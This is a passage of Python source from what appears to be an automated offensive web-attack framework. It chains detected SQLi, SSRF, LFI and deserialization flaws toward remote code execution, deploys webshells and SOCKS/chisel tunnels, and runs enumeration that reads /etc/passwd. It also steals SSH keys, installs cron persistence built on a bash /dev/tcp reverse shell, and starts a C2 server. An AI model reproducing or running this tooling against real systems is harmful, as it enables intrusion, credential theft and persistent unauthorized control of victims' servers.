            self.context_memory.set("os_type", "linux", "port_scan", 0.60)

        vc = self.vuln_ctx.get()
        if vc.dbms:
            self.context_memory.set("dbms", vc.dbms, "vuln_context", 0.85)
        if vc.cloud_provider:
            self.context_memory.set("cloud_provider", vc.cloud_provider, "vuln_context", 0.80)
        if vc.os_type:
            self.context_memory.set("os_type", vc.os_type, "vuln_context", 0.80)
        if vc.ssti_engine:
            self.context_memory.set("template_engine", vc.ssti_engine, "vuln_context", 0.85)
        if vc.has_admin_panel:
            self.context_memory.set("admin_panel", True, "vuln_context", 0.75)
        if vc.has_graphql:
            self.context_memory.set("has_graphql", True, "vuln_context", 0.80)
        if vc.ssrf_cloud_creds:
            self.context_memory.set("cloud_creds", vc.ssrf_cloud_creds, "vuln_context", 0.90)
        if vc.lfi_readable_paths:
            self.context_memory.set("lfi_readable_paths", vc.lfi_readable_paths, "vuln_context", 0.85)
        if vc.debug_endpoints:
            self.context_memory.set("debug_endpoints", vc.debug_endpoints, "vuln_context", 0.85)
        if vc.discovered_versions:
            for k, val in vc.discovered_versions.items():
                self.context_memory.set(k, val, "vuln_context", 0.80)

        best_paths = vc.best_exploit_path()
        if best_paths:
            self.context_memory.set("best_exploit_paths", best_paths, "vuln_context", 0.85)

    def phase_auth_bypass(self) -> Dict:
        result = auth_bypass.check(self.target, self.sess, self.timeout)
        self.state["phases"]["auth_bypass"] = result
        self._save_phase("auth_bypass")
        return result

    def phase_detect(self) -> Dict:
        recon = self.state["phases"].get("recon", {})
        active = self._select_detectors()
        print("  -> Active detectors (%d): %s" % (len(active), ", ".join(active)))

        cached_waf = self.context_memory.get("waf")
        if cached_waf:
            waf_info = {"name": cached_waf}
            print("  [WAF] %s detected (cached)" % cached_waf)
        else:
            waf_info = waf_bypass.fingerprint_waf(self.target, self.sess, self.timeout)
            waf_name_val = waf_info.get("name")
            if waf_name_val:
                self.context_memory.set("waf", waf_name_val, "waf_bypass", 0.90)
                print("  [WAF] %s detected - using bypass strategies" % waf_name_val)
        waf_name = waf_info.get("name")
        self.state["waf"] = waf_info

        points = self._build_test_points()
        points = self._filter_by_budget(points)
        budget_pct = self._budget_remaining() / self.time_budget * 100
        print("  -> %d test points (%.0f%% budget remaining)" % (len(points), budget_pct))

        cb_id = "scan_%d" % id(self)
        oob_url = self.oob_server.register_callback_id(cb_id)
        oob_domain = None
        if self.oob_server.start_dns():
            oob_domain = self.oob_server.start_dns()

        profiled = self.profiler.profile_batch(points, self.sess, self.timeout)
        if profiled:
            print("  -> %d endpoints profiled for anomaly detection" % profiled)

        all_findings = {}
        self._lock = threading.Lock()
        done = [0]
        total = len(points)

        def worker(point):
            findings = self._test_single_point(
                point, active, waf_name,
                oob_url=oob_url, oob_domain=oob_domain,
            )
            with self._lock:
                for f in findings:
                    key = "%s|%s|%s" % (f["type"], f["url"], f["param"])
                    all_findings[key] = f
                done[0] += 1
                if done[0] % 5 == 0 or done[0] == total:
                    print("    \r    progress: %d/%d (found %d)" % (
                        done[0], total, len(all_findings)), end="", flush=True)

        if self.threads > 1 and budget_pct > 10:
            max_workers = max(1, min(self.threads, len(points)))
            with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as ex:
                futures = {ex.submit(worker, p): p for p in points}
                for future in concurrent.futures.as_completed(futures):
                    if not self._budget_ok(3):
                        for f in futures:
                            f.cancel()
                        break
                    try:
                        future.result(timeout=2)
                    except Exception:
                        pass
        else:
            for p in points:
                if not self._budget_ok(2):
                    break
                worker(p)
        print()

        oob_callbacks = self.oob_server.pop_callbacks(cb_id)
        oob_hits = len(oob_callbacks)
        if oob_hits:
            print("  [OOB] %d blind callbacks received" % oob_hits)
            all_findings["__oob_callbacks__"] = {
                "type": "oob",
                "url": self.target,
                "param": "",
                "result": {
                    "vulnerable": True, "type": "oob_callback",
                    "confidence": "high", "confirmed": True,
                    "evidence": ["%d OOB callbacks" % oob_hits],
                    "callbacks": [{"path": c.path, "client": str(c.client)} for c in oob_callbacks[:10]],
                },
            }

        self.state["phases"]["detect"] = {"test_points": total, "findings": all_findings}
        self.all_findings = all_findings
        self._save_findings(all_findings)
        self._save_phase("detect")
        self._run_kali_recon()

        print("  [Semantic] Response structure analysis ...")
        sem_count = 0
        try:
            baseline_resp = self.sess.get(self.target, timeout=self.timeout)
            baseline_sig = analyze_single_response(baseline_resp.text, baseline_resp.status_code,
                                                     baseline_resp.headers.get("content-type", ""))
        except Exception:
            baseline_sig = None

        for key, finding in list(all_findings.items()):
            if key.startswith("__") or not finding.get("vulnerable"):
                continue
            resp_text = finding.get("response_text", "") or finding.get("result", {}).get("response_text", "")
            if resp_text and len(resp_text) > 50:
                sem = analyze_single_response(resp_text, 200, "")
                finding["semantic"] = sem
                if baseline_sig:
                    changes = compare_responses(baseline_sig, sem)
                    if changes:
                        finding["response_changes"] = changes
                        sem_count += 1
                errors = sem.get("errors", [])
                if errors:
                    finding["error_signals"] = errors
        if sem_count:
            print("    -> %d findings with anomalous response structure" % sem_count)

        # Second-order verification for high-confidence findings
        print("  [Verify] Second-order cross-validation ...")
        verified_count = 0
        for key, finding in list(all_findings.items()):
            if key.startswith("__"):
                continue
            if finding.get("confidence_score", 0) < 0.5:
                continue
            vtype = finding.get("type", "")
            url = finding.get("url", "")
            param = finding.get("param", "")
            try:
                vresult = self.verifier.verify(url, param, vtype, finding.get("result", {}))
                if vresult.get("confirmed"):
                    finding["second_order_verified"] = True
                    finding["verification_confidence"] = vresult.get("confidence", 0)
                    finding["verification_methods"] = vresult.get("methods_succeeded", [])
                    verified_count += 1
                    # Update attack graph
                    if self.attack_graph:
                        node_id = "%s_found" % vtype
                        if node_id in self.attack_graph.nodes:
                            self.attack_graph.integrate_evidence(node_id, True, vresult.get("confidence", 0.8))
            except Exception as e:
                logger.debug("Second-order verification failed: %s", e)

        if verified_count:
            print("    -> %d findings cross-verified" % verified_count)

        print("  [TypeConfusion] Type confusion & TOCTOU detection ...")
        tc_detector = TypeConfusionDetector(self.sess, self.timeout)
        tc_count = 0
        for point in points[:100]:
            if not self._budget_ok(2):
                break
            try:
                tc_results = tc_detector.detect(
                    point["url"], point["param"], point.get("method", "GET")
                )
                for tc in tc_results:
                    if tc.success or tc.error_leak:
                        key = "type_confusion|%s|%s" % (point["url"], point["param"])
                        all_findings[key] = {
                            "type": tc.vuln_type or "type_confusion",
                            "url": point["url"],
                            "param": point["param"],
                            "vulnerable": True,
                            "confidence_score": 0.70 if tc.success else 0.50,
                            "evidence": [tc.evidence] if tc.evidence else ["type_confusion_detected"],
                            "tc_detail": {
                                "original_type": tc.original_type,
                                "confused_type": tc.confused_type,
                                "status_changed": tc.status_changed,
                                "error_leak": tc.error_leak,
                                "risk_level": tc.risk_level,
                            },
                            "timestamp": time.time(),
                        }
                        tc_count += 1

                toctou_results = tc_detector.detect_toctou(
                    point["url"], point["param"], point.get("method", "GET")
                )
                for toctou in toctou_results:
                    if toctou.success:
                        key = "race_condition|%s|%s" % (point["url"], point["param"])
                        if key not in all_findings:
                            all_findings[key] = {
                                "type": "race_condition",
                                "url": point["url"],
                                "param": point["param"],
                                "vulnerable": True,
                                "confidence_score": 0.75,
                                "evidence": [toctou.evidence],
                                "timestamp": time.time(),
                            }
                            tc_count += 1
            except Exception as e:
                logger.debug("type confusion: %s", e)

        if tc_count:
            print("    -> %d type confusion / TOCTOU findings" % tc_count)

        self.state["ai_prepared"] = {
            "waf": waf_info.get("name", ""),
            "technologies": [t["name"] for t in recon.get("technologies", {}).get("technologies", [])],
            "debug_endpoints": self.vuln_ctx.get().debug_endpoints,
        }

        if self._backtrack_findings:
            print("  [Bayes] Updating hypotheses with %d findings ..." % len(self._backtrack_findings))
            evidence_map = {}
            for f in self._backtrack_findings:
                vt = f.get("type", "").lower()
                evidence_map[vt] = f.get("result", f)
            if self.last_hypotheses:
                self.last_hypotheses = self.reasoner.update_with_evidence(
                    self.last_hypotheses, evidence_map)
                revised = self.reasoner.suggest_detectors(self.last_hypotheses)
                new_detectors = [d for d in revised if d not in active]
                if new_detectors:
                    print("    -> Revised detector priority: first %d remain, added %s" % (
                        len(active), new_detectors[:3]))

        return all_findings

    def phase_ai_hunt(self) -> Dict:
        print("  [Intel] Gathering deep response intelligence ...")
        result = {"anomalies_found": 0, "scan_count": 0}
        try:
            from tools.ai_vuln_hunter import generate_target_brief
            self.state["phases"].get("recon", {})
            findings = self.all_findings
            waf_data = self.state.get("waf", {})
            ai_prep = self.state.get("ai_prepared", {})

            intel = generate_target_brief(
                sess=self.sess,
                base_url=self.target,
                timeout=self.timeout,
                findings=findings,
                recon_data={
                    "technologies": ai_prep.get("technologies", []),
                    "waf": ai_prep.get("waf", waf_data.get("name", "")),
                    "debug_endpoints": ai_prep.get("debug_endpoints", []),
                },
                context_memory=self.context_memory,
                vuln_ctx=self.vuln_ctx,
            )
            self.state["phases"]["ai_hunt"] = intel
            print()
            print(intel.get("brief", ""))
            print()
            anom = intel.get("anomalies_found", 0)
            deep = intel.get("deep_results_count", 0)
            print("    -> %d endpoints deep-scanned, %d behavioral anomalies" % (deep, anom))
            result = intel
        except Exception as e:
            logger.debug("AI hunt: %s", e)
            self.state["phases"]["ai_hunt"] = {"error": str(e)}
        self._save_phase("ai_hunt")
        return result

    def phase_pivot(self) -> Dict:
        findings = self.all_findings
        plan = self.attack_plan or {}
        pivot_results = {"pivot_actions": [], "exploits": []}

        vuln_list = []
        for k, f in findings.items():
            vuln_list.append({"type": f["type"], "url": f["url"], "param": f["param"]})

        confirmed_types = {v["type"].lower() for v in vuln_list}

        if self.last_hypotheses:
            evidence_map = {}
            for v in vuln_list:
                evidence_map[v["type"]] = {"vulnerable": True}
            self.last_hypotheses = self.reasoner.update_with_evidence(
                self.last_hypotheses, evidence_map)
            chains = self.reasoner.suggest_chains(self.last_hypotheses, confirmed_types)
        else:
            chains = []

        if self._chain_cache:
            for key, r in self._chain_cache.items():
                pivot_results["pivot_actions"].append(r)
            print("  [Pivot] %d chains already executed during backtrack" % len(self._chain_cache))

        pivoted = pivot_on_intermediate_result(
            {"vulnerabilities": vuln_list},
            plan,
        )

        from tools.chain_engine import ChainEngine
        chain = ChainEngine(self.sess, self.timeout)

        chain_map = {
            "ssrf_to_rce": ("ssrf", chain.chain_ssrf_to_rce),
            "lfi_to_rce": ("lfi", chain.chain_lfi_to_rce),
            "sqli_to_rce": ("sqli", chain.chain_sqli_to_rce),
            "xss_to_hijack": ("xss", chain.chain_xss_to_hijack),
            "auth_bypass_to_rce": ("auth_bypass", lambda u, p: chain.chain_auth_to_admin()),
            "deser_to_rce": ("deser", chain.chain_deser_to_rce),
        }

        used_chains = set()
        for chain_name, ep, param in chains:
            if chain_name in chain_map and chain_name not in used_chains:
                needed_type, fn = chain_map[chain_name]
                matching = [v for v in vuln_list if v["type"] == needed_type]
                for v in matching:
                    print("    [Reason] Chain %s %s via %s?%s" % (chain_name, v["type"], v["url"], v["param"]))
                    used_chains.add(chain_name)
                    try:
                        r = fn(v["url"], v["param"])
                        pivot_results["pivot_actions"].append(r)
                        if r.get("success"):
                            print("      [CRITICAL] Chain %s confirmed!" % chain_name)
                        if r.get("credentials_extracted"):
                            print("      [CREDENTIAL] %s" % r["credentials_extracted"][:3])
                        if r.get("rce_available"):
                            print("      [RCE] %s via %s" % (chain_name, r.get("rce_method", "unknown")))
                    except Exception as e:
                        logger.debug("chain %s: %s", chain_name, e)
                    break

        if pivoted.get("pivoted"):
            print("  [Pivot] Attack surface triggered additional chain actions:")

            for ph in pivoted.get("phases", []):
                if ph.get("phase") in ("ssrf_pivot",) and "ssrf_to_rce" not in used_chains:
                    for v in vuln_list:
                        if v["type"] == "ssrf":
                            print("    -> SSRF detected, running cloud metadata + internal scan chain")
                            r = chain.chain_ssrf_to_rce(v["url"], v["param"])
                            pivot_results["pivot_actions"].append(r)
                            used_chains.add("ssrf_to_rce")

                            print("    -> SSRF multi-hop chain (Redis/SQL/Docker/K8s) ...")
                            try:
                                ssrf_chain_result = ssrf_chain_attack(
                                    v["url"], v["param"], self.sess, self.timeout, max_hops=3
                                )
                                pivot_results["pivot_actions"].append(ssrf_chain_result)
                                if ssrf_chain_result.get("rce_achieved"):
                                    print("      [CRITICAL] SSRF chain achieved RCE via %s" % ssrf_chain_result.get("rce_method"))
                                if ssrf_chain_result.get("services_found"):
                                    print("      [INTERNAL] %d internal services discovered" % ssrf_chain_result["services_found"])
                                if ssrf_chain_result.get("ssh_keys"):
                                    print("      [SSH] SSH key injected via Redis")
                            except Exception as e:
                                logger.debug("ssrf chain: %s", e)
                            break

                if ph.get("phase") in ("lfi_pivot",) and "lfi_to_rce" not in used_chains:
                    for v in vuln_list:
                        if v["type"] == "lfi":
                            print("    -> LFI detected, running log poison + environ leak chain")
                            r = chain.chain_lfi_to_rce(v["url"], v["param"])
                            pivot_results["pivot_actions"].append(r)
                            used_chains.add("lfi_to_rce")
                            break

                if ph.get("phase") in ("sqli_pivot",) and "sqli_to_rce" not in used_chains:
                    for v in vuln_list:
                        if v["type"] == "sqli":
                            print("    -> SQLi detected, running data extraction + shell chain")
                            r = chain.chain_sqli_to_rce(v["url"], v["param"])
                            pivot_results["pivot_actions"].append(r)
                            used_chains.add("sqli_to_rce")
                            break

                if ph.get("phase") in ("jwt_pivot",):
                    for v in vuln_list:
                        if v["type"] == "jwt":
                            print("    -> JWT found, running alg none + weak secret + KID injection")
                            try:
                                from tools import jwt_exploiter
                                exploit_r = jwt_exploiter.check(
                                    url=v["url"], param=v["param"], sess=self.sess,
                                    timeout=self.timeout,
                                )
                                pivot_results["pivot_actions"].append({
                                    "chain": "jwt_exploit", "result": exploit_r,
                                })
                                if exploit_r.get("vulnerable"):
                                    print("      [CRITICAL] JWT bypassed!")
                            except Exception as e:
                                logger.debug("jwt pivot: %s", e)

                if ph.get("phase") in ("auth_pivot",) and "auth_bypass_to_rce" not in used_chains:
                    auth_data = self.state["phases"].get("auth_bypass", {})
                    if auth_data.get("vulnerable"):
                        print("    -> Auth bypass found, escalating to admin")
                        r = chain.chain_auth_to_admin(self.target)
                        pivot_results["pivot_actions"].append(r)
                        used_chains.add("auth_bypass_to_rce")
                        if r.get("success"):
                            print("      [CRITICAL] Admin access achieved via auth escalation!")

                if ph.get("phase") in ("deser_pivot",) and "deser_to_rce" not in used_chains:
                    for v in vuln_list:
                        if v["type"] == "deser":
                            print("    -> Deserialization found, running gadget chain")
                            r = chain.chain_deser_to_rce(v["url"], v["param"])
                            pivot_results["pivot_actions"].append(r)
                            used_chains.add("deser_to_rce")
                            if r.get("success"):
                                print("      [CRITICAL] Deserialization gadget confirmed!")
                            break

                if ph.get("phase") in ("graphql_pivot",):
                    for v in vuln_list:
                        if v["type"] == "graphql":
                            pivot_results["pivot_actions"].append({
                                "chain": "graphql_deep",
                                "url": v["url"],
                                "action": "introspection + batch + depth analysis",
                            })
                            break

        self.state["phases"]["pivot"] = pivot_results
        self._save_phase("pivot")
        return pivot_results

    def _run_kali_recon(self):
        from tools.kali_executor import is_available
        if not is_available():
            return
        print("  [Kali] Running heavy recon tools...")
        from tools import kali_toolset
        try:
            tech_result = kali_toolset.whatweb_identify(self.target)
            if tech_result.get("technologies"):
                print("  [Kali] whatweb: %d technologies detected" % len(tech_result["technologies"]))
                self.state["technologies"] = tech_result["technologies"]
        except Exception as e:
            logger.debug("kali whatweb: %s", e)
        try:
            nmap_result = kali_toolset.nmap_scan(self.target, fast=True)
            if nmap_result.get("ports"):
                print("  [Kali] nmap: %d open ports found" % nmap_result["count"])
                self.state["open_ports"] = nmap_result["ports"]
        except Exception as e:
            logger.debug("kali nmap: %s", e)
        try:
            nuclei_result = kali_toolset.nuclei_scan(self.target)
            if nuclei_result.get("findings"):
                print("  [Kali] nuclei: %d template matches" % nuclei_result["count"])
                existing = self.state["phases"].get("detect", {}).get("findings", {})
                for f in nuclei_result["findings"]:
                    key = "nuclei|%s|%s" % (f.get("template", ""), self.target)
                    existing[key] = {"type": "nuclei", "url": self.target, "param": "",
                                     "result": {"vulnerable": True, "template": f}}
                self.state["nuclei_findings"] = nuclei_result["findings"]
        except Exception as e:
            logger.debug("kali nuclei: %s", e)

    def phase_dual_session(self) -> Dict:
        if self.high_priv_sess is None:
            return {"skipped": True, "reason": "no high_priv session"}
        points = self._build_test_points()
        result = self.dual_session.test_batch(points, self.timeout)
        bola_count = result.get("bola_count", 0)
        info_count = result.get("info_disclosure_count", 0)
        if bola_count or info_count:
            print("  -> %d BOLA, %d info disclosure across %d endpoints" % (
                bola_count, info_count, result.get("tested", 0)))
            findings = self.state["phases"].get("detect", {}).get("findings", {})
            for f in result.get("bola_findings", []):
                key = "bola|%s|%s" % (f.get("url", ""), f.get("param", "id"))
                findings[key] = {"type": "bola", "url": f.get("url", ""), "param": f.get("param", "id"),
                                 "result": {"vulnerable": True, "type": "bola", "confidence": "high",
                                            "evidence": f.get("evidence", [])}}
            for f in result.get("info_disclosure_findings", []):
                key = "info_disclosure|%s|%s" % (f.get("url", ""), f.get("param", "id"))
                findings[key] = {"type": "info_disclosure", "url": f.get("url", ""), "param": f.get("param", "id"),
                                 "result": {"vulnerable": True, "type": "info_disclosure", "confidence": "high",
                                            "evidence": f.get("evidence", [])}}
        self.state["phases"]["dual_session"] = result
        return result

    def phase_weaponize(self) -> Dict:
        findings = self.state["phases"].get("detect", {}).get("findings", {})
        auth_data = self.state["phases"].get("auth_bypass", {})
        exploits = {}
        raw_sess = self.sess
        webshell_urls = []

        def _weaponize_one(key, finding):
            vtype = finding["type"]
            url = finding["url"]
            param = finding["param"]
            result = {}
            nonlocal webshell_urls

            if vtype == "sqli":
                for mod_name, mod in [("sqli_weaponizer", sqli_weaponizer)]:
                    try:
                        result[mod_name] = mod.check(url, param, raw_sess, self.timeout)
                    except Exception as e:
                        logger.debug("sqli weaponize %s: %s", mod_name, e)
                    if result.get(mod_name, {}).get("vulnerable") or result.get(mod_name, {}).get("data_extracted"):
                        result["exploit_ready"] = True
                from tools.kali_executor import is_available as kali_avail
                if kali_avail():
                    try:
                        from tools import kali_toolset
                        sqlmap_r = kali_toolset.sqlmap_detect(url, param)
                        if sqlmap_r.get("vulnerable") or sqlmap_r.get("data"):
                            result["sqlmap"] = sqlmap_r
                            result["exploit_ready"] = True
                            if sqlmap_r.get("data"):
                                result["extracted_data"] = sqlmap_r["data"]
                    except Exception as e:
                        logger.debug("sqlmap weaponize: %s", e)

                from tools.weaponize_engine import sqli_into_outfile
                web_root = self.vuln_ctx.get().discovered_versions.get("web_root", "/var/www/html")
                sqli_shell = sqli_into_outfile(url, param, raw_sess, self.timeout, web_root)
                if sqli_shell.get("success"):
                    result["sqli_webshell"] = sqli_shell
                    result["exploit_ready"] = True
                    if sqli_shell.get("webshell_url"):
                        webshell_urls.append(sqli_shell["webshell_url"])

            if vtype == "ssrf":
                try:
                    from tools import ssrf_pwn as ssrf_lateral
                    lat = ssrf_lateral.run(url, param, sess=raw_sess, timeout=self.timeout)
                    result["ssrf_lateral"] = lat
                    result["ssrf_pwn"] = ssrf_lateral.check(url, param, sess=raw_sess, timeout=self.timeout)
                    cloud_meta = lat.get("cloud_metadata", {})
                    if cloud_meta:
                        meta_text = json.dumps(cloud_meta)
                        from tools.cloud_pwn import check as cloud_check
                        c_result = cloud_check(meta_text)
                        if c_result.get("success"):
                            result["cloud_pwn"] = c_result
                            result["exploit_ready"] = True
                except Exception as e:
                    logger.debug("ssrf weaponize: %s", e)

            if vtype == "lfi":
                v = finding.get("result", {})
                if v.get("rce_available"):
                    result["rce"] = True
                    result["exploit_ready"] = True
                    try:
                        from tools.reverse_shell import deploy_webshell
                        ws = deploy_webshell(url, webshell_type="php_cmd",
                                           sess=raw_sess, timeout=self.timeout)
                        if ws.get("success"):
                            result["webshell"] = ws
                    except Exception as e:
                        logger.debug("webshell deploy: %s", e)

                from tools.weaponize_engine import deploy_webshell_lfi
                lfi_ws = deploy_webshell_lfi(url, param, raw_sess, self.timeout)
                if lfi_ws.get("success"):
                    result["lfi_webshell"] = lfi_ws
                    result["exploit_ready"] = True
                    result["webshell"] = result.get("webshell", {})
                    result["webshell"]["lfi_auto"] = lfi_ws

            if vtype == "xss":
                try:
                    from tools import xss_validator
                    result["xss_validated"] = xss_validator.check(url, param, raw_sess, self.timeout)
                except Exception as e:
                    logger.debug("xss validate: %s", e)

            if vtype == "jwt":
                tokens = finding.get("result", {}).get("tokens_found", [])
                for token_entry in tokens:
                    token_str = token_entry.get("token", "")
                    if token_str:
                        try:
                            jwt_r = jwt_exploiter.check(token=token_str, sess=raw_sess,
                                                        url=url, param=param, timeout=self.timeout)
                            result["jwt_exploit"] = jwt_r
                        except Exception as e:
                            logger.debug("jwt exploit: %s", e)
                if not result:
                    try:
                        none_token = jwt_exploiter.check(token=None, sess=raw_sess,
                                                         url=url, param=param, timeout=self.timeout)
                        result["jwt_none_test"] = none_token
                    except Exception as e:
                        logger.debug("jwt none test: %s", e)

            if result:
                return key, result
            return None, None

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = {ex.submit(_weaponize_one, k, f): k for k, f in findings.items()}
            for future in concurrent.futures.as_completed(futures):
                try:
                    k, r = future.result()
                    if k and r:
                        exploits[k] = r
                except Exception:
                    pass

        auth_findings = auth_data.get("path_bypasses", []) + auth_data.get("cookie_bypasses", []) + auth_data.get("header_bypasses", [])
        if auth_findings:
            exploits["auth_bypass"] = {"total": len(auth_findings), "findings": auth_findings, "exploit_ready": True}

        self.state["phases"]["weaponize"] = exploits
        self._save_phase("weaponize")
        return exploits

    def phase_advanced(self, exploits: Dict) -> Dict:
        result = {"tunnels": [], "c2_active": False, "ssh_keys": [], "post_exploit": False}
        webshell_urls = []
        for k, v in exploits.items():
            for subkey in ("webshell", "sqli_webshell", "lfi_webshell"):
                sub = v.get(subkey, {})
                if isinstance(sub, dict) and sub.get("webshell_url"):
                    webshell_urls.append(sub["webshell_url"])

        if webshell_urls:
            from tools.tunnel_agent import chisel_tunnel, socks5_over_webshell
            ws_url = webshell_urls[0]
            print("  [Advanced] Deploying SOCKS5 tunnel via webshell ...")
            tunnel = socks5_over_webshell(ws_url)
            if tunnel["success"]:
                result["tunnels"].append(tunnel)
                cmds = tunnel.get("deploy_commands", [])
                for cmd in cmds[:1]:
                    try:
                        r = self.sess.get(ws_url, params={"c": cmd}, timeout=10)
                        if r.status_code == 200:
                            logger.info("Tunnel cmd sent: %s...", cmd[:60])
                    except Exception:
                        pass
            chisel = chisel_tunnel(self.target)
            if chisel["success"]:
                result["chisel_tunnel"] = chisel

            from tools.interactive_shell import PTYShell
            def _exec_cmd(c):
                try:
                    r = self.sess.get(ws_url, params={"c": c}, timeout=10)
                    return {"success": r.status_code == 200, "output": r.text[:2000]}
                except Exception as e:
                    return {"success": False, "error": str(e)}

            pty = PTYShell(_exec_cmd)
            upg = pty.upgrade()
            if upg["success"]:
                result["pty_upgrade"] = upg
            enum_r = pty._run("hostname;id;whoami;cat /etc/passwd 2>/dev/null | head -5;ifconfig 2>/dev/null | head -3 || ip addr 2>/dev/null | head -3")
            if enum_r:
                result["enum_output"] = enum_r[:500] if isinstance(enum_r, str) else str(enum_r.get("output", ""))[:500]

            from tools.lateral_move import steal_ssh_keys
            ssh_keys = steal_ssh_keys(_exec_cmd)
            if ssh_keys.get("success"):
                result["ssh_keys"] = ssh_keys["keys"]
                print("    -> %d SSH keys stolen" % len(ssh_keys["keys"]))

            from tools.post_exploit import cron_persistence, webshell_persistence
            persist_ws = webshell_persistence(ws_url)
            persist_cron = cron_persistence("bash -c 'exec 5<>/dev/tcp/%s/4444;cat<&5|while read l;do $l 2>&5>&5;done' &" % self.target)
            result["post_exploit"] = {
                "webshell_hidden": persist_ws["paths"],
                "cron_job": persist_cron.get("cron_line"),
            }

        from tools.c2_beacon import C2Server
        try:
            c2 = C2Server(bind_port=9999)
            c2.start()
            result["c2"] = {"port": 9999, "agents_endpoint": "/beacon"}
            result["c2_active"] = True
        except Exception as e:
            logger.debug("c2 start: %s", e)

        self.state["phases"]["advanced"] = result
        self._save_phase("advanced")
        return result

    def phase_report(self) -> Dict:
        report = {
            "target": self.target,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "summary": {},
            "details": {},
        }
        detection = self.state["phases"].get("detect", {})
        findings = detection.get("findings", {})
        exploits = self.state["phases"].get("weaponize", {})
        auth_data = self.state["phases"].get("auth_bypass", {})
        recon = self.state["phases"].get("recon", {})

        by_type = {}
        for key, f in findings.items():
            vt = f["type"]
            by_type.setdefault(vt, []).append(f)

        by_url = {}
        for f in findings.values():
            u = f["url"]
            by_url.setdefault(u, []).append(f["type"])

        report["summary"]["vulnerabilities"] = len(findings)
        report["summary"]["by_type"] = {k: len(v) for k, v in by_type.items()}
        report["summary"]["by_url"] = {k: len(v) for k, v in by_url.items()}
        report["summary"]["exploit_ready"] = len(exploits)

        exploit_ready_details = []
        for k, v in exploits.items():
            if v.get("exploit_ready"):
                exploit_ready_details.append(k)
        auth_total = auth_data.get("total_bypasses", 0)
        if auth_total > 0:
            exploit_ready_details.append("auth_bypass(%d)" % auth_total)
        report["summary"]["exploit_ready_details"] = exploit_ready_details

        critical_flags = ["rce_available", "rce", "shell", "data_extracted", "credential_access", "exploit_ready"]
        report["summary"]["critical"] = any(
            any(f.get("result", {}).get(k) for k in critical_flags) for f in findings.values()
        ) or bool(exploit_ready_details)

        report["summary"]["affected_urls"] = list(by_url.keys())
        report["summary"]["param_hits"] = [
            "%s?%s [%s]" % (f["url"], f["param"], f["type"]) for f in findings.values()
        ]

        for vt, flist in by_type.items():
            report["details"][vt] = flist
        report["exploits"] = exploits
        report["auth_bypass"] = {k: v for k, v in auth_data.items() if k != "vulnerable"}

        techs = recon.get("technologies", {})
        ports = recon.get("open_ports", {})
        git = recon.get("git_leak", {})
        dirs = recon.get("directories", {})
        crawl_summary = self.state["phases"].get("crawl", {}).get("summary", {})
        mine_data = self.state["phases"].get("param_mine", {})
        total_mined = sum(len(pd.get("all_params", [])) for pd in mine_data.values() if isinstance(pd, dict))
        waf_info = self.state.get("waf", {})

        report["recon"] = {
            "technologies": [t["name"] for t in techs.get("technologies", [])],
            "open_ports": [p["port"] for p in ports.get("open_ports", [])],
            "git_exposed": git.get("git_exposed", False),
            "git_sensitive": len(git.get("sensitive_finds", [])),
            "directories": len(dirs.get("interesting", [])),
            "pages_crawled": crawl_summary.get("pages_crawled", 0),
            "endpoints": crawl_summary.get("endpoints_found", 0),
            "params_mined": total_mined,
            "test_points": detection.get("test_points", 0),
            "is_spa": crawl_summary.get("is_spa", False),
            "js_api_discovered": crawl_summary.get("js_api_discovered", 0),
            "waf": waf_info.get("name"),
            "risk_score": self.attack_plan.get("risk_score", 0) if self.attack_plan else 0,
        }

        # Enhanced report sections
        report["attack_graph"] = self.attack_graph.summary() if self.attack_graph else {}
        report["context_memory"] = self.context_memory.get_stats()
        report["second_order_verified"] = sum(
            1 for f in findings.values()
            if f.get("second_order_verified")
        )

        self.state["phases"]["report"] = report
        self._save_phase("report")
        if self._storage:
            try:
                cur = self._storage._conn.cursor()
                cur.execute(
                    "UPDATE sessions SET report=?, updated_at=? WHERE id=?",
                    (json.dumps(report), time.time(), self._storage.session_id())
                )
                self._storage._conn.commit()
            except Exception as e:
                logger.debug("save report: %s", e)
        return report

    def run(self) -> Dict:
        start = time.time()
        self.oob_server.start()

        self.phase_recon()
        self.phase_attack_plan()
        self.phase_reason()

        print("[*] Phase 2/7: Crawling %s ..." % self.target)
        crawl_result = self.phase_crawl()
        cs = crawl_result.get("summary", {})
        spa_tag = " [SPA]" if cs.get("is_spa") else ""
        extra = ""
        if cs.get("js_api_discovered", 0):
            extra = ", %d JS API routes" % cs.get("js_api_discovered", 0)
        print("  -> %d pages, %d endpoints%s, %d params%s" % (
            cs.get("pages_crawled", 0), cs.get("endpoints_found", 0),
            extra, cs.get("unique_params", 0), spa_tag))

        if cs.get("is_spa") and PlaywrightEngine.is_available():
            print("[*] SPA detected, launching browser-based crawler ...")
            try:
                spa_result = crawl_spa(self.target)
                if spa_result.get("api_routes"):
                    print("  -> %d API routes, %d JS routes discovered via browser" % (
                        len(spa_result.get("api_routes", [])),
                        len(spa_result.get("js_api_routes", [])),
                    ))
                    crawl_result["spa_crawl"] = spa_result
                    self.state["phases"]["crawl"] = crawl_result
                    for ep in spa_result.get("api_routes", []):
                        if ep not in crawl_result.get("endpoints", {}):
                            crawl_result["endpoints"][ep] = {
                                "url": "%s%s" % (self.target, ep),
                                "methods": ["GET"], "params": [], "spa_api": True,
                            }
            except Exception as e:
                logger.debug("spa crawl: %s", e)

        print("[*] Phase 3/7: Parameter mining ...")
        mine_result = self.phase_mine(crawl_result)
        total_mined = sum(len(pd.get("all_params", [])) for pd in mine_result.values() if isinstance(pd, dict))
        print("  -> %d params discovered across %d endpoints" % (total_mined, len(mine_result)))

        print("[*] Phase 4/7: Auth bypass probing ...")
        auth_result = self.phase_auth_bypass()
        ab_total = auth_result.get("total_bypasses", 0)
        print("  -> %d bypass vectors (%d path, %d cookie, %d header, %d method)" % (
            ab_total,
            len(auth_result.get("path_bypasses", [])),
            len(auth_result.get("cookie_bypasses", [])),
            len(auth_result.get("header_bypasses", [])),
            len(auth_result.get("method_bypasses", [])),
        ))

        print("[*] Phase 5/7: Vulnerability detection (%d threads) ..." % self.threads)
        findings = self.phase_detect()
        by_type = {}
        for f in findings.values():
            by_type.setdefault(f["type"], 0)
            by_type[f["type"]] += 1
        by_type_str = " ".join("[%s:%d]" % (k.upper(), v) for k, v in sorted(by_type.items()))
        print("  -> %d vulnerabilities found: %s" % (len(findings), by_type_str))

        print("[*] Phase 5b/7: Deep response intelligence gathering ...")
        self.phase_ai_hunt()

